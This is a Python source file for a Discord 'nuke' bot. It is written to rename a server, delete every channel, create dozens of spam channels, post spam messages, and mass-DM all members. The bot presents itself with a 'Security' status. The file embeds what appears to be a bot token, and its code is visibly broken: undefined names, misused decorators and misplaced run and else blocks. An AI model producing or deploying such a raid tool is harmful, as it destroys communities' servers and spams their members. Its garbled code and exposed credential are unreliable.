import discord
from discord.ext.commands import Bot
from discord import Client
from discord.ext import commands
import asyncio

bot = discord.Client()

bot = commands.Bot(command_prefix='!')

@bot.event
async def on_ready():
    print ("Bot Online!")
    print (bot.user.name)
    await client.change_presence(activity=discord.Game('Security'))

@bot.event
async def ping(ctx):
    await ctx.send(f'Pong! {round(client.latency * 1000)}ms')

@bot.event
async def invite(ctx):
  await ctx.reply('')

@bot.event
async def nuke(ctx):

    await ctx.guild.edit(name='SERVER NAME') #Decide what to change the server name to

    for c in ctx.guild.channels:
        await c.delete()

    guild = ctx.message.guild

    n=0
    while(n<=85):
        await guild.create_text_channel('CHANNEL NAME HERE') # Decide what should be the name of the text channels that you will create
        n = n+1

    for c in ctx.guild.text_channels:
             await c.send('fullsusnowinnit')
     
     
 
 
@bot.event
async def dmall(ctx, *,args=None):
     if args != None:
       members = ctx.guild.members
     for member in members:
       try:
         await member.send(args)
       except:
        print ("Nope Dint Work")
     else:
        await ctx.send("Please provide a arguement")
     
    
     client.run('ODgyMjU0OTgxMjA0NDI2ODAy.YS4t-w.oW3FQOVIUTZuyWDcMyklafanEAIODgyMjU0OTgxMjA0NDI2ODAy.YS4t-w.oW3FQOVIUTZuyWDcMyklafanEAI')
